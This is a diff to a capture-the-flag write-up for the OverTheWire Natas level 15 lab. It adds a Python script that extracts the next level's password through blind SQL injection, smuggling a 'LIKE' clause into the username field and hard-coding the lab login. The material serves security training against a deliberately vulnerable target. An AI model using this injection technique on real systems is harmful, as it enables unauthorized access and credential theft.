@@ -33,6 +33,28 @@ injecting the following in the username will give the pass
 - the anything character or the wild-card character in a SQL `like` statement is `%`
 - putting `BINARY` right before the field in the Select statement we'll make that field case sensitive
 
+```
+import requests
+import string
+characters = string.ascii_letters + "0123456789"
 
+username = 'natas15'
+password = 'SdqIqBsFcz3yotlNYErZSZwblkm0lrvx'
+
+url = 'http://natas15.natas.labs.overthewire.org/?debug=true'
+sessions = requests.Session()
+seen = list()
+
+while (True):
+    for ch in characters:
+        print("trying character with password" , "".join(seen) + ch)
+
+        response = sessions.post(url,data={ "username" : 'natas16" AND BINARY password LIKE "' + "".join(seen) + ch +'%" #'},auth = (username,password))
+
+        content = response.text
+        if "user exists" in content:
+            seen.append(ch)
+            break
+```
 ### References
 https://www.youtube.com/watch?v=krp0qCOAnFE&list=PL1H1sBF1VAKWM3wMCn6H5Ql6OrgIivt2V&index=12
